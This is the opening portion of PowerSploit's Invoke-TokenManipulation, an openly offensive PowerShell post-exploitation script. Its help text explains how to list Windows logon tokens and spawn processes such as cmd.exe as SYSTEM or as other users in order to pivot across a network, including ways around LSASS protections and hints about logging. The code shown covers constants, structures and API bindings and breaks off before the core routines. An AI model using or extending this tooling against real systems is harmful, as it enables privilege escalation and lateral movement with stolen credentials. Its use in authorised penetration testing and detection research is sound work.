function Invoke-TokenManipulation
{
<#
.SYNOPSIS

This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
This functionality is very similar to the incognito tool (with some differences, and different use goals).

This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).

Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon
Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
credentials for the authentication.

IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone".
This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
This could show up in logs depending on the level of monitoring.


PERMISSIONS REQUIRED:
SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.


Important differences from incognito:
First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
without dumping credentials.

In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
for tokens which were created with desirable logon tokens (and only displays them by default).

In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).


PowerSploit Function: Invoke-TokenManipulation
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.11
(1.1 -> 1.11: PassThru of System.Diagnostics.Process object added by Rune Mariboe, https://www.linkedin.com/in/runemariboe)

.DESCRIPTION

Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.

.PARAMETER Enumerate

Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).

.PARAMETER RevToSelf

Switch. Stops impersonating an alternate users Token.

.PARAMETER ShowAll

Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).

.PARAMETER ImpersonateUser

Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.

.PARAMETER CreateProcess

Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.

.PARAMETER WhoAmI

Switch. Displays the credentials the PowerShell thread is running under.

.PARAMETER Username

Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.

.PARAMETER ProcessId

Specify the Token to use by ProcessId. This will use the primary token of the process specified.

.PARAMETER Process

Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.

.PARAMETER ThreadId

Specify the Token to use by ThreadId. This will use the token of the thread specified.

.PARAMETER ProcessArgs

Specify the arguments to start the specified process with when using the -CreateProcess mode.

.PARAMETER NoUI

If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the
current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
to "Everyone".

.PARAMETER PassThru

If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.


.EXAMPLE

Invoke-TokenManipulation -Enumerate

Lists all unique usable tokens on the computer.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"

Spawns cmd.exe as SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"

Makes the current PowerShell thread impersonate SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500

Spawns cmd.exe using the primary token belonging to process ID 500.

.EXAMPLE

Invoke-TokenManipulation -ShowAll

Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500

Spawns cmd.exe using the token belonging to thread ID 500.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"

Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.

.EXAMPLE

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()

Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser

Makes the current thread impersonate the lsass security token.

.NOTES
This script was inspired by incognito.

Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
BIG THANKS to Matt Graeber for helping debug.

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/

#>

    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    param (
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru
    )

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
    #Define all the structures/enums that will be used
    #    This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #ENUMs
    $TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
    $TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
    $TypeBuilder.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
    $TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()

    #STRUCTs
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
    $LARGE_INTEGER = $TypeBuilder.CreateType()

    #Struct LUID
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
    $LUID = $TypeBuilder.CreateType()

    #Struct TOKEN_STATISTICS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
    $TOKEN_STATISTICS = $TypeBuilder.CreateType()

    #Struct LSA_UNICODE_STRING
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
    $LSA_UNICODE_STRING = $TypeBuilder.CreateType()

    #Struct LSA_LAST_INTER_LOGON_INFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
    $LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()

    #Struct SECURITY_LOGON_SESSION_DATA
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Session', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginServer', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('DnsDomainName', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('Upn', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LastLogonInfo', $LSA_LAST_INTER_LOGON_INFO, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonScript', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('ProfilePath', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectory', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectoryDrive', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogoffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('KickOffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
    $SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
    $STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
    $PROCESS_INFORMATION = $TypeBuilder.CreateType()

    #Struct TOKEN_ELEVATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
    $TOKEN_ELEVATION = $TypeBuilder.CreateType()

    #Struct LUID_AND_ATTRIBUTES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()

    #Struct TOKEN_PRIVILEGES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACE_HEADER', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AceType', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceFlags', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceSize', [UInt16], 'Public') | Out-Null
    $ACE_HEADER = $TypeBuilder.CreateType()

    #Struct ACL
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACL', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AclRevision', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz1', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AclSize', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceCount', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
    $ACL = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACCESS_ALLOWED_ACE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Header', $ACE_HEADER, 'Public') | Out-Null
    $TypeBuilder.DefineField('Mask', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('SidStart', [UInt32], 'Public') | Out-Null
    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()

    #Struct TRUSTEE
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TRUSTEE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
    $TRUSTEE = $TypeBuilder.CreateType()

    #Struct EXPLICIT_ACCESS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('EXPLICIT_ACCESS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Trustee', $TRUSTEE, 'Public') | Out-Null
    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
    $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)

    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
    $GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)

    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
    $SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
    $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
    $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
    $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
    $LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
    $CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    $CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
    $DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    $DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
